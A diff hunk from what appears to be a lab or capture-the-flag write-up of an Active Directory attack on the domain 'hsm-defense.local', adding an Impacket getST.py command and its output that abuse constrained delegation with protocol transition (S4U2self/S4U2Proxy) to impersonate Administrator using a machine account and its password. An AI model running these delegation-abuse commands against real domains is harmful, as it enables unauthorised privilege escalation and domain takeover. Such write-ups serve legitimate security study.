@@ -823,5 +823,18 @@ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -u 'svc_delegate' -p '
 Then ill add the `TRUSTED_TO_AUTH_FOR_DELEGATION`, this will allow protocol transition making the attack much easier since ill be able to impersonate any user i want
 
 ```python
+getST.py -spn "ldap/dc.hsm-defense.local" -impersonate "Administrator" "hsm-defense.local"/"helpdesk01$":'Password123' -k
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@ldap_dc.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
 ```
+
+Now i can request the ticket for the administrator using the `helpdesk01$` found earlier
+
+
+
